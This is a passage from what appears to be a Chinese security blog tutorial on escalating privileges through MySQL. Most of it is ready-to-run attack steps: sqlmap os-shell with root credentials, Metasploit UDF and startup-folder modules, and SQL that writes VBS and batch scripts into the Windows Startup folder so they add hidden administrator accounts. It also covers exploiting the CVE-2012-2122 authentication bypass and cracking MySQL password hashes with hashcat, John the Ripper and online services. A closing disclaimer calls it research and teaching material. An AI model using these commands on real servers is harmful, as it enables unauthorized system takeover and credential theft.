sqlmap.py -d "mysql://root:123456@219.115.1.1:3306/mysql" --os-shell


（2）选择操作系统的架构，32位操作系统选择1，64位选择2.


（3）自动上传udf或提示os-shell


（4）执行whomai命令如果获取系统权限，则表示提权成功。
```

7、msf  udf 提权

```
Kali渗透测试平台下执行（kali下载地https://www.kali.org/downloads/）
msfconsole
use exploit/windows/mysql/mysql_payload
options
set rhost 192.168.2.1
set rport 3306
set username root
set password 123456
run 0或者exploit


msf下udf提权成功率并不高，跟windows操作系统版本，权限和数据库版本有关，特别是secure-file-priv选项，如果有该选项基本不会成功。
```

8、启动项提权

1. 创建表并插入 vbs 脚本到表中

```
依次使用以下命令：
show databases ;
use test;
show tables;
create table a (cmd text); 
insert into a values ("set wshshell=createobject (""wscript.shell"" ) " ); 
insert into a values ("a=wshshell.run (""cmd.exe /c net user aspnetaspnettest/add"",0)") ;
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators aspnet /add"",0) " ); 
select \ from a;
```

2. 导出 vbs 脚本到启动

```
使用以下命令将刚才在a表中创建的vbs脚本导出到启动选项中。
select \ from a into outfile "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\a.vbs";


导入成功后，系统重新启动时会自动添加密码为“1”且用户名称为“1”的用户到管理员组中。在实际使用过程中该脚本成功执行的几率比较低，有时候会出现不能导出的错误.


推荐使用以下脚本：


show databases ;
use test;
show tables;
create table b (cmd text); 
insert into b values ("net user Aspnet123545345! /add");
insert into b values ("net localgroup administrators Aspnet /add");
insert into b values ("del b.bat");
select  from b into outfile "C:\Documents and Settings\All Users\「开始」菜单\程序\启动\b.bat";


该脚本执行后虽然会闪现Dos窗口，如果有权限导入到启动选项中，则一定会执行成功，在虚拟机中通过MySQL连接器连接并执行以上命令后，在C:\Documents and Settings\All Users\「开始」菜单\程序\启动目录中会有刚才导出的b.bat脚本文件


说明


在不同的操作系统中C:\Documents and Settings\All Users\「开始」菜单\程序\启动目录文件名称可能会不同，这个时候就要将其目录换成相应的目录名称即可。例如如果是英文版本操作系统则其插入的代码为：


select  from b into outfile "C:\Documents and Settings\All Users\Start Menu\Programs\Startup\b.bat";


Windows 2008 Server的启动目录为：


C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\iis.vbs


其vbs方法可以参考如下写法：


create table a (cmd text);
insert into a values ("set wshshell=createobject (""wscript.shell"" ) " );
insert into a values ("a=wshshell.run (""cmd.exe /c net user antian365 qwer1234!@# /add"",0) " );
insert into a values ("b=wshshell.run (""cmd.exe /c net localgroup Administrators antian365 /add"",0) " );
select \ from a into outfile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\iis.vbs";
```

3.msf 下模块 exploit/windows/mysql/mysql_start_up 提权

```
use exploit/windows/mysql/mysql_start_up
set rhost 192.168.2.1
set rport 3306
set username root
set password 123456
run
msf下mysql_start_up提权有一定的几率，对英文版系统支持较好。
```

9.Msf 其它相关漏洞提权

1.Mysql 身份认证漏洞及利用 (CVE-2012-2122)

当连接 MariaDB/MySQL 时，输入的密码会与期望的正确密码比较，由于不正确的处理，会导致即便是 memcmp() 返回一个非零值，也会使 MySQL 认为两个密码是相同的。也就是说只要知道用户名，不断尝试就能够直接登入 SQL 数据库。按照公告说法大约 256 次就能够蒙对一次。受影响的产品：All MariaDB and MySQL versions up to 5.1.61, 5.2.11, 5.3.5, 5.5.22 存在漏洞.

MariaDB versions from 5.1.62, 5.2.12, 5.3.6, 5.5.23 不存在漏洞.

MySQL versions from 5.1.63, 5.5.24, 5.6.6 are not 不存在漏洞.

      1.use auxiliary/scanner/mysql/mysql_authbypass_hashdump

2.exploit/windows/mysql/mysql_yassl_hello

3.exploit/windows/mysql/scrutinizer_upload_exec

10.mysql 密码破解

A、cain 工具破解 mysql 密码

使用 UltraEdit-32 编辑器直接打开 user.MYD 文件，打开后使用二进制模式进行查看，在 root 用户后面是一串字符串，选中这些字符串将其复制到记事本中，这些字符串即为用户加密值，例如 506D1427F6F61696B4501445C90624897266DAE3。

注意：

（1）root 后面的 “” 不要复制到字符串中。

（2）在有些情况下需要往后面看看，否则得到的不是完整的 MYSQLSHA1 密码，总之其正确的密码位数是 40 位。

安装 cain 工具，使用 cracker，右键单击 “Add tolist” 将 Mysql Hashes 值加入到破解列表中，使用软件中的字典、暴力破解等方式来进行暴力破解。

B、网站在线密码破解

1.cmd5.com 破解。将获取的 mysql 值放在 cmd5.com 网站中进行查询，mysql 密码一般都是收费的。

2.somd5.com 破解。Somd5.com 是后面出现的一个免费破解网站，每次破解需要手工选择图形码进行破解，速度快，效果好，只是每次只能破解一个，而且破解一次后需要重新输入验证码。

C、oclhash 破解

hashcat 支持很多种破解算法，免费开源软件，官方网站 https://hashcat.net/hashcat/，破解命令：

hashcat64.exe -m 200myql.hashpass.dict // 破解 MySQL323 类型

hashcat64.exe -m 300myql.hashpass.dict // 破解 MySQL4.1/MySQL5 类型

D、 John the Ripper password cracker

John the Ripper 下载地址：http://www.openwall.com/john/h/john179w2.zip，John the Ripper 除了能够破解 linux 外，还能破解多种格式的密码。

```
Echo 81F5E21E35407D884A6CD4A731AEBFB6AF209E1B>hashes.txt
John –format =mysql-sha1 hashes.txt
john --list=formats | grep mysql //查看支持mysql密码破解的算法
```

参考（https://www.ddosi.com/b147/）

免责声明：本站提供安全工具、程序 (方法) 可能带有攻击性，仅供安全研究与教学之用，风险自负!

转载声明：著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。

订阅查看更多复现文章、学习笔记

thelostworld

安全路上，与你并肩前行！！！！

![](https://mmbiz.qpic.cn/mmbiz_jpg/uljkOgZGRjeUdNIfB9qQKpwD7fiaNJ6JdXjenGicKJg8tqrSjxK5iaFtCVM8TKIUtr7BoePtkHDicUSsYzuicZHt9icw/640?wx_fmt=jpeg)

个人知乎：https://www.zhihu.com/people/fu-wei-43-69/columns

个人简书：https://www.jianshu.com/u/bf0e38a8d400

个人 CSDN：https://blog.csdn.net/qq_37602797/category_10169006.html

个人博客园：https://www.cnblogs.com/thelostworld/

FREEBUF 主页：https://www.freebuf.com/author/thelostworld?type=article

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcW6VR2xoE3js2J4uFMbFUKgglmlkCgua98XibptoPLesmlclJyJYpwmWIDIViaJWux8zOPFn01sONw/640?wx_fmt=png)

欢迎添加本公众号作者微信交流，添加时备注一下 “公众号”  

![](https://mmbiz.qpic.cn/mmbiz_png/uljkOgZGRjcSQn373grjydSAvWcmAgI3ibf9GUyuOCzpVJBq6z1Z60vzBjlEWLAu4gD9Lk4S57BcEiaGOibJfoXicQ/640?wx_fmt=png)